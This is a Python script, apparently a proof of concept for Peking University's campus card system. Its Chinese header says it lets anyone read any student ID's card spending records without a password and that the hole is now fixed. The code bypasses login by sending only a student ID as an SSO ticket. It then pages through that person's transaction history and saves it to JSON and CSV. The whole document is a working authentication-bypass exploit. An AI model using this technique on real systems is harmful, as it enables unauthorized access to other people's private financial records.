'''
不知道密码就可查询任何学号的校园卡消费信息！
https://bbs.pku.edu.cn/v2/post-read.php?bid=668&threadid=17344380

当然，这个漏洞已经被修复了

这里是漏洞的最终呈现版，要看初稿的请移步`origin.py`
'''
from requests import Session
from random import random
from json import dump
from csv import DictWriter
from re import search

import config

with Session() as s:
    r = s.post('https://card.pku.edu.cn/cassyno/index', data={
        'errorcode': 1,
        'continueurl': '',
        'ssoticketid': config.user_name
    })
    print(r.text)
    r = s.post('https://card.pku.edu.cn/Page/Page', data={
        'flowID': 15,
        'type': 1,
        'apptype':  2,
        'Url': '%23',
        'MenuName': '流水查询',
        'EMenuName': '流水查询',
    })
    print(r.text)
    account = search(r"var acc = '(\d+)'", r.text).group(1)
    with open(config.output_file_name+'.json', 'w', encoding='utf-8') as f:
        data = []
        i = 1
        # 要获取第一个才知道总记录数，条件判断就放后面了
        while True:
            r = s.post('https://card.pku.edu.cn/Report/GetPersonTrjn', data={
                'sdate': config.start_date,
                'edate': config.end_date,
                'account': account,
                'page': i,
            })
            print(r.text)
            json_data = r.json()
            # 每页获取的是一个列表，不要用append哦！
            data.extend(json_data['rows'])
            total = json_data['total']
            # ensure_ascii会escape中文，禁用可使显示人话
            # 设置indent，不要一行显示
            # 为什么要保存一个json呢？听说把抓到的东西立马保存下来是个好习惯
            dump(json_data, f, ensure_ascii=False, indent=4)
            # 手动向上取整
            if i >= (total // 15) + (total % 15 > 0):
                break
            i += 1


# 获取json的键列表
fields = data[0].keys()
# 用utf-8 +bom保存，可支持Excel查看
# newline要为空字符，因为csv模块有自己的新行管理办法
with open(config.output_file_name+'.csv', 'w', encoding='utf-8-sig',
          newline='') as f:
    writer = DictWriter(f, fieldnames=fields)
    # 写标题栏
    writer.writeheader()
    for rec in data:
        # 这里获得的数据有末尾空格，去掉
        rec['MERCNAME'] = rec['MERCNAME'].strip()
        rec['TRANNAME'] = rec['TRANNAME'].strip()
        print(rec)
        writer.writerow(rec)
